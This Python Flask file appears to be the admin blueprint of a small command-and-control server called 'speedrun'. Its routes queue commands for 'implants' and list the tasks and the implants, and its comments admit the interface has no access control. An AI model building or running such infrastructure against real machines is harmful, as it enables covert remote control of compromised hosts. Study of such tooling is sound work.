from flask import Blueprint, request ,jsonify
from speedrun.db import db
from speedrun.models import Task, random_id, Implant, CREATED
admin = Blueprint('admin', __name__)



@admin.route("/admin/hello")
def hello_admin():
    return "Hello Admin!"


# todo: don't let eveyrone have access to my admin itnerface 

# constatns for task


""""
class Task(db.Model):
    id =  db.Column(db.Integer, primary_key=True)
    task_id = db.Column(db.String)
    implant_id = db.Column(db.String)
    cmd = db.Column(db.String)
    args = db.Column(db.String)
    
    status =  db.Column(db.String)
"""

def create_task_helper(implant_id, cmd, args):
    if implant_id == "" or cmd == "":
        return ""
    task = Task(
        task_id =random_id(),
        implant_id=implant_id, 
        cmd = cmd, 
        args = args, 
        status = CREATED
    )
    db.session.add(task)
    db.session.commit()
    return task.task_id

def list_tasks():
    tasks = list(Task.query.all())
    return tasks 

def list_implant():
    implants = list(Implant.query.all())
    return implants 

@admin.route("/task/create", methods=["POST"])
def create_task():
    # todo: add logic to ensure that the implant even exists!
    data = request.get_json() 
    #implant_id = data.get("implant_id")
    #cmd = data.get("cmd")
    #args = data.get("args")
    task_id = create_task_helper(**data)
    if task_id == "":
        return jsonify({"status": False, "msg": "failed to create task. one or more required arguments are empty"})
    return jsonify({"status": True, "msg":task_id })

@admin.route("/task/list", methods= ["GET"])
def task_list():
    # todo: use dataclase
    #t = [{"implant_id": i.implant_id, "task_id": i.task_id, "status": i.status, "cmd": i.cmd,"args": i.args} for i in list_tasks()]
    t = [i.toJSON() for i in list_tasks()]
    return jsonify(t)


@admin.route("/implant/list", methods= ["GET"])
def implant_list():
    # todo: use dataclase
    # todo add rest of the fields 
    #t =  [{"implant_id": i.implant_id, "os_name": i.os_name} for i in list_implant()]
    t = [ i.toJSON() for i in list_implant()]
    return jsonify(t)

